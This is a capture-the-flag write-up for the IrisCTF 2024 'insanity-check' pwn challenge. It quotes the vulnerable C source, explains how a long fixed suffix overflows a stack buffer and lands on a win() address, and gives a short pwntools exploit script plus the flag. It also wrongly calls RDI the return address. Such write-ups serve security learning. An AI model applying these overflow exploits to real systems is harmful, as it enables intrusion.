---
layout: writeup
category: Iris-CTF-2024
chall_description: N/A
points: 50
solves: 254
tags: pwn buffer-overflow ret2win
date: 2024-12-7
comments: false
---

I've tried the brand new michael-ld linker on my hello world program. I'm pretty sure it's super safe now.  
`nc insanity-check.chal.irisc.tf 10003`  
[insanity-check.tar.gz](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/Iris-CTF-2024/insanity-check.tar.gz)  

---

We're given an ELF binary and a C source file. Here's `vuln.c`:  

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void rstrip(char* buf, const size_t len) {
    for (int i = len - 1; i >= 0; i--)
        if (buf[i] == '\n') {
            buf[i] = '\0';
            break;
        }
}

const char suffix[] = "! Welcome to IrisCTF2024. If you have any questions you can contact us at test@example.com\0\0\0\0";

int main() {
    char message[128];
    char name[64];
    fgets(name, 64, stdin);
    rstrip(name, 64);

    strcpy(message, "Hi there, ");
    strcpy(message + strlen(message), name);
    memcpy(message + strlen(message), suffix, sizeof(suffix));

    printf("%s\n", message);
}

__attribute__((section(".flag")))
void win() {
    __asm__("pop %rdi");
    system("cat /flag");
}
```

Firstly, we can clearly recognize the use of `fgets()`, which is known to be safe from buffer overflow. Thus, we can't directly overflow the `name` variable, as it is allocated 64 bytes and fgets ensures the program only reads 64 bytes.  

However, something else seems to be happening. We are also adding some other strings onto the name to create a message, and printing it back to the user. There's no format string vulnerability, as `%s` is used for the printf call. But, that `suffix` variable seems pretty long... and we're only allocated 128 bytes for the `message` variable. Can we cause a buffer overflow there?  

I sent 64 bytes of input to the program, and sure enough, we got a segfault. There's our vulnerability!  

But, there's a slight problem. We can't directly modify RDI (i.e. the return address) with our input, as it's not long enough. But there's a very suspicious string at the end of `suffix`... why are there 4 null bytes?  

At this point, I realized the trick. Maybe the end of the suffix very conveniently turned out to be the address of the win function?  

Running `file vuln` (since I forgot to do it before), I realized that this was an x86-64 ELF, which means the 4 null bytes at the end made sense. Then, with pwntools, I checked the win address with `print(elf.symbols['win'])`, which returned `0x6d6f632e`. That looks suspiciously like ASCII. A quick hex to ASCII conversion shows that it definitely is!  

Hence, we just have to send in the correct offset of bytes to get the win address to align correctly. Simple guess and check should work, as with pwndbg's gdb, it'll show us what part of the string is currently filling the win address. Thus, here's the final exploit after guess and check:  

```py
from pwn import *
import pwnlib.util.packing as pack

elf = ELF("./vuln")
context.binary = elf
context.log_level = "DEBUG"
context(terminal=["tmux","split-window", "-h"])

# p = process('./vuln')
# gdb.attach(p)
p = remote('insanity-check.chal.irisc.tf', 10003)

p.sendline(
    b'A'*56
)

p.interactive()
```

And here's the flag!  

    irisctf{c0nv3n13nt_symb0l_pl4cem3nt}